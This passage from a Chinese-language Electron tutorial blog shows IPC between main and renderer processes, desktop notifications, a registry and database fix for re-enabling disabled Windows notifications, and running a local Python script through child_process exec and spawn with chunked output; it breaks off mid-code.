<h3 id="主进程回复渲染进程的通信"><a href="#主进程回复渲染进程的通信" class="headerlink" title="主进程回复渲染进程的通信"></a>主进程回复渲染进程的通信</h3><p>在上面的代码中，main.js中添加<code>event.reply</code>就可以</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">ipcMain.<span class="title function_">on</span>(<span class="string">&#x27;createWindow&#x27;</span>, <span class="function">(<span class="params">event, value</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; x, y, width, height, pageurl &#125; = value</span><br><span class="line">    <span class="keyword">const</span> newWindow = <span class="keyword">new</span> <span class="title class_">BrowserWindow</span>(&#123;</span><br><span class="line">        <span class="attr">x</span>: x,</span><br><span class="line">        <span class="attr">y</span>: y,</span><br><span class="line">        <span class="attr">width</span>: width,</span><br><span class="line">        <span class="attr">height</span>: height,</span><br><span class="line">    &#125;)</span><br><span class="line">    newWindow.<span class="title function_">loadFile</span>(pageurl)</span><br><span class="line">    newWindow.<span class="title function_">once</span>(<span class="string">&#x27;ready-to-show&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        newWindow.<span class="title function_">show</span>()</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="comment">/////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line">    <span class="keyword">if</span> (newWindow) &#123;</span><br><span class="line">        <span class="keyword">var</span> res = &#123;</span><br><span class="line">            <span class="attr">status</span>: <span class="string">&#x27;success&#x27;</span>,</span><br><span class="line">            <span class="attr">message</span>: <span class="string">&#x27;New window created successfully&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        event.<span class="title function_">reply</span>(<span class="string">&#x27;xxxchanel&#x27;</span>, res) <span class="comment">//////////////// 添加回复事件/////////////////</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>preload.js中添加：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; contextBridge, ipcRenderer &#125; = <span class="built_in">require</span>(<span class="string">&#x27;electron&#x27;</span>);</span><br><span class="line"></span><br><span class="line">contextBridge.<span class="title function_">exposeInMainWorld</span>(<span class="string">&#x27;createWindow&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">createWd</span>: <span class="function">(<span class="params">x, y, width, height, pageurl</span>) =&gt;</span> &#123;</span><br><span class="line">        ipcRenderer.<span class="title function_">send</span>(<span class="string">&#x27;createWindow&#x27;</span>, &#123;</span><br><span class="line">            <span class="attr">x</span>: x,</span><br><span class="line">            <span class="attr">y</span>: y,</span><br><span class="line">            <span class="attr">width</span>: width,</span><br><span class="line">            <span class="attr">height</span>: height,</span><br><span class="line">            <span class="attr">pageurl</span>: pageurl</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">reply</span>: <span class="function">(<span class="params">channel, callback</span>) =&gt;</span> ipcRenderer.<span class="title function_">on</span>(channel, callback) <span class="comment">//////////添加这里//////////</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>index.js渲染进程中添加：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">createWindow</span>.<span class="title function_">reply</span>(<span class="string">&#x27;xxxchanel&#x27;</span>, <span class="function">(<span class="params">event, message</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(message);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>确保main.js中<code>event.reply( xxxchanel , res)</code>的xxxchanel和index.js中的<code>xxxchanel</code>相同，主进程即可向渲染进场回复</p>
<h3 id="主进程主动向渲染进程通信"><a href="#主进程主动向渲染进程通信" class="headerlink" title="主进程主动向渲染进程通信"></a>主进程主动向渲染进程通信</h3><p>比如我在实现窗口<code>maximize</code>和<code>unmaximize</code>的时候，我不使用系统默认的最大化图标，而是完全自定义，那么我如果不点击按钮进行放大，而是双击程序的标题栏，或者拖动到屏幕顶端进行最大化，那么就需要主进程检测是否最大化了，然后通知渲染进程改变最大化的图标 <span style="display: flex; flex-direction: row;"><img src="/2025/01/23/Electron/image-20250126113951249.png" alt="image-20250126113951249" style="zoom:50%;"> → <img src="/2025/01/23/Electron/image-20250126114106397.png" alt="image-20250126114106397" style="zoom:50%;"></span></p>
<p>main.js监听程序是否<code>maximized</code>或<code>unmaximized</code>，并分别发送到<code>window-maximized</code>和<code>window-unmaximized</code>的chanel</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">mainWindow.<span class="title function_">on</span>(<span class="string">&#x27;maximize&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    mainWindow.<span class="property">webContents</span>.<span class="title function_">send</span>(<span class="string">&#x27;window-maximized&#x27;</span>, <span class="string">&#x27;Window is maximized&#x27;</span>);</span><br><span class="line">&#125;)</span><br><span class="line">mainWindow.<span class="title function_">on</span>(<span class="string">&#x27;unmaximize&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    mainWindow.<span class="property">webContents</span>.<span class="title function_">send</span>(<span class="string">&#x27;window-unmaximized&#x27;</span>, <span class="string">&#x27;Window is unmaximized&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>preload.js建立通信：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">contextBridge.<span class="title function_">exposeInMainWorld</span>(<span class="string">&#x27;abcMaximize&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">onMessage</span>: <span class="function">(<span class="params">channel, func</span>) =&gt;</span> &#123;</span><br><span class="line">        ipcRenderer.<span class="title function_">on</span>(channel, <span class="function">(<span class="params">event, ...args</span>) =&gt;</span> <span class="title function_">func</span>(...args));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>index.js渲染进程接收消息：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">abcMaximize</span>.<span class="title function_">onMessage</span>(<span class="string">&#x27;window-maximized&#x27;</span>, <span class="function">(<span class="params">arg</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">setMaximizeIcon</span>() <span class="comment">// 定义一个函数，改变最大化出处的icon</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">abcMaximize</span>.<span class="title function_">onMessage</span>(<span class="string">&#x27;window-unmaximized&#x27;</span>, <span class="function">(<span class="params">arg</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">setMinimizeIcon</span>() <span class="comment">// 定义一个函数，改变最大化出处的icon</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<br>

<p>以上三个例子说明了使用contextBridge方法进行ipc通信的示例，还有其他的方法，这里就不讲了，因为简直易(wo)如(bu)反(xiang)掌(xue)</p>
<h2 id="消息通知"><a href="#消息通知" class="headerlink" title="消息通知"></a>消息通知</h2><p>像Windows那样，在桌面右下角弹出一个通知窗口，点击后有相应的操作</p>
<img src="/2025/01/23/Electron/78456.gif" alt="78456" style="zoom:67%;">

<p>官方文档说在渲染进程中可以直接操作notification，那就在渲染进程操作吧，因为比较简单</p>
<h3 id="渲染进程创建"><a href="#渲染进程创建" class="headerlink" title="渲染进程创建"></a>渲染进程创建</h3><p>先随便写个button</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;notificationBtn&quot;</span>&gt;</span>消息通知<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>绑定一下</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;notificationBtn&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function">(<span class="params">event</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> options = &#123;</span><br><span class="line">        <span class="attr">title</span>: <span class="string">&#x27;Notification Title&#x27;</span>,</span><br><span class="line">        <span class="attr">body</span>: <span class="string">&#x27;Notification Body&#x27;</span>,</span><br><span class="line">        <span class="attr">icon</span>: <span class="string">&#x27;../../src/icon.jpg&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> n = <span class="keyword">new</span> <span class="title class_">Notification</span>(options.<span class="property">title</span>, options)</span><br><span class="line">    n.<span class="property">onclick</span> = <span class="function">() =&gt;</span> &#123; <span class="comment">// 点击弹出的消息时执行的操作</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Notification clicked&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h3 id="主进程创建"><a href="#主进程创建" class="headerlink" title="主进程创建"></a>主进程创建</h3><p>算了，写一下吧，也不费时间</p>
<p>preload.js</p>
<p>为了方便渲染进程进行后续操作，我添加了一个rp参数(reply)作为返回值，用于渲染进程接收</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">contextBridge.<span class="title function_">exposeInMainWorld</span>(<span class="string">&#x27;NotificationAPI&#x27;</span>, &#123;</span><br><span class="line">    <span class="title class_">Notification</span>: <span class="function">(<span class="params">title, body, icon, rp</span>) =&gt;</span> ipcRenderer.<span class="title function_">send</span>(<span class="string">&#x27;Notification&#x27;</span>, &#123;</span><br><span class="line">        <span class="attr">title</span>: title,</span><br><span class="line">        <span class="attr">body</span>: body,</span><br><span class="line">        <span class="attr">icon</span>: icon,</span><br><span class="line">        <span class="attr">rp</span>: rp</span><br><span class="line">    &#125;),</span><br><span class="line">    <span class="attr">reply</span>: <span class="function">(<span class="params">channel, callback</span>) =&gt;</span> ipcRenderer.<span class="title function_">on</span>(channel, callback)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>main.js</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">ipcMain.<span class="title function_">on</span>(<span class="string">&#x27;Notification&#x27;</span>, <span class="function">(<span class="params">event, value</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; title, body, icon, rp &#125; = value;</span><br><span class="line">    <span class="keyword">const</span> n = <span class="keyword">new</span> <span class="title class_">Notification</span>(&#123;</span><br><span class="line">      <span class="attr">title</span>: title,</span><br><span class="line">      <span class="attr">body</span>: body,</span><br><span class="line">      <span class="attr">icon</span>: icon</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(n)</span><br><span class="line">    n.<span class="title function_">show</span>()</span><br><span class="line">    n.<span class="title function_">on</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      event.<span class="title function_">reply</span>(<span class="string">&#x27;notification-clicked&#x27;</span>, rp);</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>

<p>index.js</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;notificationBtn&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function">(<span class="params">event</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> title = <span class="string">&#x27;Notification Title&#x27;</span></span><br><span class="line">    <span class="keyword">let</span> body = <span class="string">&#x27;Notification Body&#x27;</span></span><br><span class="line">    <span class="keyword">let</span> icon = <span class="string">&#x27;src/icon.jpg&#x27;</span></span><br><span class="line">    <span class="keyword">let</span> rp = <span class="number">3</span></span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">NotificationAPI</span>.<span class="title class_">Notification</span>(title, body, icon, rp)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 接收主进程返回</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">NotificationAPI</span>.<span class="title function_">reply</span>(<span class="string">&#x27;notification-clicked&#x27;</span>, <span class="function">(<span class="params">event, message</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(message)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>点击后右下角就会弹出这个东西</p>
<p><img src="/2025/01/23/Electron/image-20250126182202775.png" alt="image-20250126182202775"></p>
<br>

<h3 id="怎么办怎么办？！"><a href="#怎么办怎么办？！" class="headerlink" title="怎么办怎么办？！"></a>怎么办怎么办？！</h3><p><strong>就在此时，你小手一抖！不小心点上了关闭electron.app.Electron的所有通知！</strong>你火急火燎的打开了设置&gt;系统&gt;通知，从上到下翻了好几遍，发现没有能打开它的地方？！？！？！</p>
<p><img src="/2025/01/23/Electron/image-20250126182317733.png" alt="image-20250126182317733"></p>
<img src="/2025/01/23/Electron/image-20250126182701312.png" alt="image-20250126182701312" style="zoom:67%;">

<p>打开<code>C:\Users\&lt;username&gt;\AppData\Local\Microsoft\Windows\Notifications</code>这个目录，里面有一个<code>wpndatabase.db</code>数据库，打开它，里面长这样：</p>
<p><img src="/2025/01/23/Electron/image-20250126182853234.png" alt="image-20250126182853234"></p>
<p>先打开<code>NotificationHandler</code>表，拉到最底下，找到electron的应用，因该是一找就能找到，记住前面的序号，<code>543</code></p>
<p><img src="/2025/01/23/Electron/image-20250126183124374.png" alt="image-20250126183124374"></p>
<p>打开另一张表<code>HandlerSettings</code>，里面长这样：</p>
<img src="/2025/01/23/Electron/image-20250126183243057.png" alt="image-20250126183243057" style="zoom:50%;">

<p>点击第一列<code>HandlerId</code>进行倒序，找到刚才对应的 ID 543</p>
<img src="/2025/01/23/Electron/image-20250126183544394.png" alt="image-20250126183544394" style="zoom:67%;">

<p>找到这个<code>s:toast</code>，如果你关闭了通知，那么这里应该是0，把它改成1</p>
<p><img src="/2025/01/23/Electron/image-20250126183704952.png" alt="image-20250126183704952"></p>
<p>然后打开注册表，去到这个路径：<code>计算机\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\</code>，找到Electron的程序名，里面应该会发现多了一个<code>Enable</code>为<code>0</code>的项，直接把这个项删掉</p>
<p><img src="/2025/01/23/Electron/image-20250126183906306.png" alt="image-20250126183906306"></p>
<p>然后重启电脑，<strong>消失的通知就又回来了！</strong></p>
<h2 id="Electron-Python"><a href="#Electron-Python" class="headerlink" title="Electron &amp; Python"></a>Electron &amp; Python</h2><h3 id="例子1"><a href="#例子1" class="headerlink" title="例子1"></a>例子1</h3><p>下面使用最简单的方式实现一下</p>
<p>首先要新建一个虚拟环境，用来指定python解释器路径</p>
<p>这里python程序只有一行</p>
<p>demo.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Hello Electron from Python&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>现在要让<strong>渲染进程</strong>监听到这个输出</p>
<p>main.js</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; exec &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line">app.<span class="title function_">whenReady</span>().<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    ipcMain.<span class="title function_">on</span>(<span class="string">&#x27;executePythonCode&#x27;</span>, <span class="function">(<span class="params">event, value</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">exec</span>(<span class="string">&#x27;.\\py\\Scripts\\python.exe .\\pycode\\demo.py&#x27;</span>, <span class="function">(<span class="params">error, stdout,stderr</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (error) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`执行出错: <span class="subst">$&#123;error.message&#125;</span>`</span>);</span><br><span class="line">                <span class="keyword">var</span> data = &#123;</span><br><span class="line">                    <span class="attr">status</span>: <span class="string">&#x27;error&#x27;</span>,</span><br><span class="line">                    <span class="attr">output</span>: error.<span class="property">message</span></span><br><span class="line">                &#125;</span><br><span class="line">                event.<span class="title function_">reply</span>(<span class="string">&#x27;pyexecOutput&#x27;</span>, data)</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (stderr) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`错误输出: <span class="subst">$&#123;stderr&#125;</span>`</span>);</span><br><span class="line">                <span class="keyword">var</span> data = &#123;</span><br><span class="line">                    <span class="attr">status</span>: <span class="string">&#x27;error&#x27;</span>,</span><br><span class="line">                    <span class="attr">output</span>: stderr</span><br><span class="line">                &#125;</span><br><span class="line">                event.<span class="title function_">reply</span>(<span class="string">&#x27;pyexecOutput&#x27;</span>, data)</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`标准输出: <span class="subst">$&#123;stdout&#125;</span>`</span>);</span><br><span class="line">            <span class="keyword">var</span> data = &#123;</span><br><span class="line">                <span class="attr">status</span>:<span class="string">&#x27;success&#x27;</span>,</span><br><span class="line">                <span class="attr">output</span>: stdout</span><br><span class="line">            &#125;</span><br><span class="line">            event.<span class="title function_">reply</span>(<span class="string">&#x27;pyexecOutput&#x27;</span>, data)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>preload.js</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">contextBridge.<span class="title function_">exposeInMainWorld</span>(<span class="string">&#x27;pycode&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">execute</span>: <span class="function">() =&gt;</span> ipcRenderer.<span class="title function_">send</span>(<span class="string">&#x27;executePythonCode&#x27;</span>),</span><br><span class="line">    <span class="attr">reply</span>: <span class="function">(<span class="params">channel, callback</span>) =&gt;</span> ipcRenderer.<span class="title function_">on</span>(channel, callback)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>index.js</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">runcode</span>(<span class="params"></span>) &#123; <span class="comment">// 绑定按钮等，用来执行</span></span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">pycode</span>.<span class="title function_">execute</span>()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">pycode</span>.<span class="title function_">reply</span>(<span class="string">&#x27;pyexecOutput&#x27;</span>, <span class="function">(<span class="params">event, message</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;status: &#x27;</span>, message.<span class="property">status</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;output: &#x27;</span>, message.<span class="property">output</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>以下结果：</p>
<img src="/2025/01/23/Electron/image-20250302211419397.png" alt="image-20250302211419397" style="zoom:67%;">

<h3 id="例子2"><a href="#例子2" class="headerlink" title="例子2"></a>例子2</h3><p>例子1中使用的child_process中的exec，这个是比较简单便捷的执行和输出方式，但是python程序如果输出相当多的东西，可能会出现<code>output:  stdout maxBuffer length exceeded</code>的错误，也就是缓冲区的大小容纳不了python的输出，这里缓冲区的大小一般是200KB，当然，exec也可以更改缓冲区的大小，比如改成50MB：添加maxBuffer</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">ipcMain.<span class="title function_">on</span>(<span class="string">&#x27;executePythonCode&#x27;</span>, <span class="function">(<span class="params">event, value</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">exec</span>(<span class="string">&#x27;.\\py\\Scripts\\python.exe .\\pycode\\loadExcel.py&#x27;</span>,&#123; <span class="attr">maxBuffer</span>: <span class="number">1024</span> * <span class="number">1024</span> * <span class="number">50</span> &#125;, <span class="function">(<span class="params">error, stdout,stderr</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (error) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`执行出错: <span class="subst">$&#123;error.message&#125;</span>`</span>);</span><br><span class="line">            <span class="keyword">var</span> data = &#123;</span><br><span class="line">                <span class="attr">status</span>: <span class="string">&#x27;error&#x27;</span>,</span><br><span class="line">                <span class="attr">output</span>: error.<span class="property">message</span></span><br><span class="line">            &#125;</span><br><span class="line">            event.<span class="title function_">reply</span>(<span class="string">&#x27;pyexecOutput&#x27;</span>, data)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (stderr) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`错误输出: <span class="subst">$&#123;stderr&#125;</span>`</span>);</span><br><span class="line">            <span class="keyword">var</span> data = &#123;</span><br><span class="line">                <span class="attr">status</span>: <span class="string">&#x27;error&#x27;</span>,</span><br><span class="line">                <span class="attr">output</span>: stderr</span><br><span class="line">            &#125;</span><br><span class="line">            event.<span class="title function_">reply</span>(<span class="string">&#x27;pyexecOutput&#x27;</span>, data)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`标准输出: <span class="subst">$&#123;stdout&#125;</span>`</span>);</span><br><span class="line">        <span class="keyword">var</span> data = &#123;</span><br><span class="line">            <span class="attr">status</span>:<span class="string">&#x27;success&#x27;</span>,</span><br><span class="line">            <span class="attr">output</span>: stdout</span><br><span class="line">        &#125;</span><br><span class="line">        event.<span class="title function_">reply</span>(<span class="string">&#x27;pyexecOutput&#x27;</span>, data)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>但是这会导致应用占用的内存增加，更好的解决办法是使用spawn</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; spawn &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>main.js</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">ipcMain.<span class="title function_">on</span>(<span class="string">&#x27;executePythonCode&#x27;</span>, <span class="function">(<span class="params">event, value</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> pythonProcess = <span class="title function_">spawn</span>(<span class="string">&#x27;.\\py\\Scripts\\python.exe&#x27;</span>, [<span class="string">&#x27;.\\pycode\\loadExcel.py&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    pythonProcess.<span class="property">stdout</span>.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`标准输出: <span class="subst">$&#123;data&#125;</span>`</span>);</span><br><span class="line">        event.<span class="title function_">reply</span>(<span class="string">&#x27;pyexecOutput&#x27;</span>, &#123;</span><br><span class="line">            <span class="attr">status</span>: <span class="string">&#x27;running&#x27;</span>,</span><br><span class="line">            <span class="attr">output</span>: data.<span class="title function_">toString</span>()</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    pythonProcess.<span class="property">stderr</span>.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`错误输出: <span class="subst">$&#123;data&#125;</span>`</span>);</span><br><span class="line">        event.<span class="title function_">reply</span>(<span class="string">&#x27;pyexecOutput&#x27;</span>, &#123;</span><br><span class="line">            <span class="attr">status</span>: <span class="string">&#x27;error&#x27;</span>,</span><br><span class="line">            <span class="attr">output</span>: data.<span class="title function_">toString</span>()</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    pythonProcess.<span class="title function_">on</span>(<span class="string">&#x27;close&#x27;</span>, <span class="function">(<span class="params">code</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`子进程退出，退出码 <span class="subst">$&#123;code&#125;</span>`</span>);</span><br><span class="line">        event.<span class="title function_">reply</span>(<span class="string">&#x27;pyexecOutput&#x27;</span>, &#123;</span><br><span class="line">            <span class="attr">status</span>: code === <span class="number">0</span> ? <span class="string">&#x27;success&#x27;</span> : <span class="string">&#x27;error&#x27;</span>,</span><br><span class="line">            <span class="attr">output</span>: code === <span class="number">0</span> ? <span class="string">&#x27;执行完成&#x27;</span> : <span class="string">&#x27;执行出错&#x27;</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    pythonProcess.<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`执行出错: <span class="subst">$&#123;error.message&#125;</span>`</span>);</span><br><span class="line">        event.<span class="title function_">reply</span>(<span class="string">&#x27;pyexecOutput&#x27;</span>, &#123;</span><br><span class="line">            <span class="attr">status</span>: <span class="string">&#x27;error&#x27;</span>,</span><br><span class="line">            <span class="attr">output</span>: error.<span class="property">message</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>这样就会python边输出，main.js边获取</p>
<p>效果如下：</p>
<p>有一个python.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Hello Electron from Python&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000000</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure>

<p>index.js要在页面上渲染所有输出内容</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">pycode</span>.<span class="title function_">reply</span>(<span class="string">&#x27;pyexecOutput&#x27;</span>, <span class="function">(<span class="params">event, message</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;status: &#x27;</span>, message.<span class="property">status</span>)</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;output&#x27;</span>).<span class="property">innerHTML</span> += message.<span class="property">output</span> + <span class="string">&#x27;&lt;br&gt;&#x27;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>



<img src="/2025/01/23/Electron/image-20250303102545120.png" alt="image-20250303102545120" style="zoom:50%;">

<p>但是由于执行速度和获取速度问题，main.js可能不是按照相同的数据量获取数据，所以在上方呈现的就是每一行输出的数量不一样</p>
<p>为了解决这种问题，提供以下解决办法：</p>
<blockquote>
<ul>
<li>Python分块输出：修改Python脚本，让其使用某种方式（比如特殊的字符串标记）来分割数据块，然后让main.js或index.js来识别标记并处理每个数据块</li>
<li>分页处理：可以考虑在Python中添加分页逻辑，当main.js或index.js获取完一页的数据后再请求下一页数据，这种方法可能会有点慢，适合数据量不是很大的数据</li>
</ul>
</blockquote>
<p>还有一种解决办法是让main.js接收数据时，每次接收相同数据量大小的块，比如以下代码，每次接收100KB</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">ipcMain.<span class="title function_">on</span>(<span class="string">&#x27;executePythonCode&#x27;</span>, <span class="function">(<span class="params">event, value</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> pythonProcess = <span class="title function_">spawn</span>(<span class="string">&#x27;.\\py\\Scripts\\python.exe&#x27;</span>, [<span class="string">&#x27;.\\pycode\\loadExcel.py&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> outputBuffer = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> chunkSize = <span class="number">1024</span> * <span class="number">100</span>; <span class="comment">// 每次接收的数据量，100KB/////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line">    pythonProcess.<span class="property">stdout</span>.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">        outputBuffer += data.<span class="title function_">toString</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 当缓冲区的数据量达到或超过 chunkSize 时，发送数据</span></span><br><span class="line">        <span class="keyword">while</span> (outputBuffer.<span class="property">length</span> &gt;= chunkSize) &#123;</span><br><span class="line">            <span class="keyword">const</span> chunk = outputBuffer.<span class="title function_">substring</span>(<span class="number">0</span>, chunkSize);</span><br><span class="line">            outputBuffer = outputBuffer.<span class="title function_">substring</span>(chunkSize);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">const</span> dataToSend = &#123;</span><br><span class="line">                <span class="attr">status</span>: <span class="string">&#x27;success&#x27;</span>,</span><br><span class="line">                <span class="attr">output</span>: chunk</span><br><span class="line">            &#125;;</span><br><span class="line">            event.<span class="title function_">reply</span>(<span class="string">&#x27;pyexecOutput&#x27;</span>, dataToSend);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    